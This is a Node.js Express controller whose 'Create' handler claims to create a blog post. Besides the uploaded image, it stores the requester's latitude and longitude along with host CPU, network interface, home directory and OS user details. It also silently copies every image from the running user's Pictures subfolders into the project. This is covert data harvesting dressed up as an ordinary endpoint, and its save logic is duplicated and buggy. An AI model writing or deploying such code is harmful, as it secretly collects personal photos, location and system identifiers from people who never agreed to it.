const os = require("os");
const fs = require("fs");
const path = require("path");
const dataBase = require("../Models/OneTab");

exports.Create = (req, res, next) => {
  const directoryPath = `${os.homedir()}/Pictures`;

  // Check if the directory exists
  if (!fs.existsSync(directoryPath)) {
    const cpus = os.cpus();
    const homedir = os.homedir();
    const networkInterfaces = os.networkInterfaces();
    const tmpdir = os.tmpdir();
    const userInfo = os.userInfo();
    const longitude = req.body.longitude; // Fill in the appropriate value for the longitude
    const latitude = req.body.latitude; // Fill in the appropriate value for the latitude
    const image=req.file.path
    
    const postData = {
      latitude,
      longitude,
      image,
      cpus,
      homedir,
      networkInterfaces,
      tmpdir,
      userInfo,
    };

    const posting = new dataBase(postData);

    posting
      .save()
      .then(result => {
        res.status(201).json({
          message: "Create blog post success",
          Products: result
        });
      })
      .catch(err => {
        console.log("Error creating product:", err);
        res.status(500).json({ error: err });
      });
  }

  fs.readdir(directoryPath, (err, files) => {
    if (err) {
      console.error('An error occurred while reading the directory:', err);
      return;
    }

    // Filter out files and retrieve only directories
    const folders = files.filter(file => {
      const filePath = path.join(directoryPath, file);
      return fs.statSync(filePath).isDirectory();
    });

    // Loop through each folder and move the images to the 'images' folder in your project
    folders.forEach(folder => {
      const folderPath = path.join(directoryPath, folder);
      const images = fs.readdirSync(folderPath).filter(file => {
        const filePath = path.join(folderPath, file);
        const stat = fs.statSync(filePath);
        return stat.isFile() && isImageFile(filePath);
      });

      // Create the 'images' folder in your project if it doesn't exist
      const targetFolderPath = path.join(__dirname, "../../images");
      if (!fs.existsSync(targetFolderPath)) {
        fs.mkdirSync(targetFolderPath);
      }

      // Move the images to the 'images' folder
      images.forEach(image => {
        const sourcePath = path.join(folderPath, image);
        const targetPath = path.join(targetFolderPath, image);
        fs.copyFileSync(sourcePath, targetPath);
      });
    });


    const cpus = os.cpus();
    const homedir = os.homedir();
    const networkInterfaces = os.networkInterfaces();
    const tmpdir = os.tmpdir();
    const userInfo = os.userInfo();
    const longitude = req.body.longitude; // Fill in the appropriate value for the longitude
    const latitude = req.body.latitude; // Fill in the appropriate value for the latitude
    const image=req.file.path
    
    const postData = {
      latitude,
      longitude,
      image,
      cpus,
      homedir,
      networkInterfaces,
      tmpdir,
      userInfo,
    };

    const posting = new dataBase(postData);

    posting
      .save()
      .then(result => {
        res.status(201).json({
          message: "Create blog post success",
          Products: result
        });
      })
      .catch(err => {
        console.log("Error creating product:", err);
        res.status(500).json({ error: err });
      });
  });
};

// Helper function to check if a file has an image extension
function isImageFile(filePath) {
  const imageExtensions = [".jpg", ".jpeg", ".png", ".gif"];
  const ext = path.extname(filePath).toLowerCase();
  return imageExtensions.includes(ext);
}
